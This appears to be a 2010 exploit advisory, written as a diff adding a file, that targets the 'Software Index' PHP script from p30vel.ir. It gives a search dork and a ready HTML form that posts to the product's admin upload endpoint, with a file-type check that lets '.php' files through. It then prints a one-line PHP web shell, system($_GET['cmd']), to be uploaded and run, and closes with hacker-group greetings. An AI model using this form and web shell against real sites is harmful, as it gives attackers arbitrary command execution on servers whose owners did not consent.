@@ -1,0 +1,129 @@
+######################################################################## 
+
+# Vendor: http://www.p30vel.ir/
+
+# Date: 2010-05-27 
+
+# Author : indoushka 
+
+# Thanks to : Inj3ct0r.com,Exploit-DB.com,SecurityReason.com,Hack0wn.com ! 
+
+# Contact : indoushka@hotmail.com 
+
+# Home :
+
+# Bug  : Up
+
+# Tested on : windows SP2 Français V.(Pnx2 2.0) 
+######################################################################## 
+                                                                                                                               
+# Dork : Copyright 2010. Software Index       
+                                                                 
+# Exploit By indoushka 
+
+	<html>
+<head>
+<Title>Select Image File for uploading</Title>
+
+<script language="JavaScript">
+function checkFile()
+{
+if (form1.userfile.value == "")
+{
+alert(" Please choose a file to upload");
+return (false);
+}
+if (form1.userfile.value.indexOf(".php") == -1 &&form1.userfile.value.indexOf(".png") == -1 &&form1.userfile.value.indexOf(".bmp") == -1 &&form1.userfile.value.indexOf(".jpeg") == -1 && form1.userfile.value.indexOf(".gif") == -1)
+{
+alert(" Please upload .gif/.jpg/.jpeg/.bmp/.png files only");
+form1.userfile.value="";
+form1.userfile.focus();
+return (false);
+}
+return(true);
+}
+
+</script>
+
+
+</head>
+
+<body>
+<b><font size="3">Upload Image</font>.</b> 
+<FORM ENCTYPE="multipart/form-data" ACTION="http://127.0.0.1/Software-Index-P30vel.ir/siteadmin/doupload.php?box=<?php echo $_REQUEST["box"]?>&func=2" METHOD=post ID=form1 NAME=form1 onSubmit="javscript:return checkFile(form1);"> 
+<input type="hidden" name="id" value="<?php echo $_SESSION[ "username" ] ?>">
+<input type="hidden" name="act" value="upload">
+<table><tr><td>
+<b><font size="3" color="#FFFFFF"><u><font color="#000000" size="2">Attachment</font></u></font></b> 
+        <table>
+          <tr> 
+            <td valign="top" width="15"><font color="#000000">1.</font></td>
+            <td width="470"><font color="#000000">To add an Attachment, click 
+              the 'Browse' button to select the file to attach, or type the path 
+              to the file in the Text-box below.</font></td>
+          </tr>
+          <tr> 
+            <td valign="top" width="15"><font color="#000000">2.</font></td>
+            <td width="470"><font color="#000000">Then click Upload button to 
+              complete the upload</font></td>
+          </tr>
+          <tr> 
+            <td valign="top" width="15"><font color="#000000">3.</font></td>
+            <td width="470"><font color="#990000">NOTE</font><font color="#000000">: 
+              The File transfer can take from a few seconds upto a few minutes 
+              depending on the size of the attachment. Please be patient while 
+              the attachment is being uploaded.</font></td>
+          </tr>
+          <tr> 
+            <td valign="top" width="15"><font color="#000000">4.</font></td>
+            <td width="470"><font color="#990000">NOTE</font><font color="#000000">: 
+              The File will be renamed if the file with the same name is present</font></td>
+          </tr>
+        </table>
+      </TD>
+    </TR> 
+<TR><TD><STRONG>Hit the [Browse] button to find the file on your computer.</STRONG><BR></TD></TR> 
+<TR><TD><strong>Image</strong>
+<INPUT NAME=userfile SIZE=30 TYPE=file   MaxFileSize="1000000"> 
+<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
+  </TD></TR>
+  <TR><TD> </TD></TR>
+  <TR><TD><input type="submit" value="Upload" name="uploadfile"></TD></TR>
+<TR><TD>NOTE: Please be patient, you will not receive any notification until the 
+file is completely transferred.<BR><BR></TD></TR>
+</table>
+
+</FORM>
+
+   
+<!--
+<Script Language="JavaScript">
+function listattach(filename)
+{
+window.opener.document.form123.<?php //request.QueryString("box") ?>.value=filename
+window.close()
+}
+</script>
+<Input type=button value=Done onClick="listattach('<?php //echo filename ?>')">
+-->
+
+</body>
+
+</html>
+
+1 - Save as php or html and upload to your localhost or server 
+
+2 - use Backdoor 
+
+<?php
+$cmd = $_GET['cmd'];
+system($cmd);
+?>
+
+3 - you see where the file uploaded
+
+Dz-Ghost Team ===== Saoucha * Star08 * Redda * theblind74 * XproratiX * onurozkan * n2n * Meher Assel ===========================
+all my friend :
+His0k4 * Hussin-X * Rafik * Yashar * SoldierOfAllah * RiskY.HaCK * Stake * r1z * D4NB4R * www.alkrsan.net * MR.SoOoFe * ThE g0bL!N
+(cr4wl3r Let the poor live ) * RoAd_KiLlEr * AnGeL25dZ
+---------------------------------------------------------------------------------------------------------------------------------
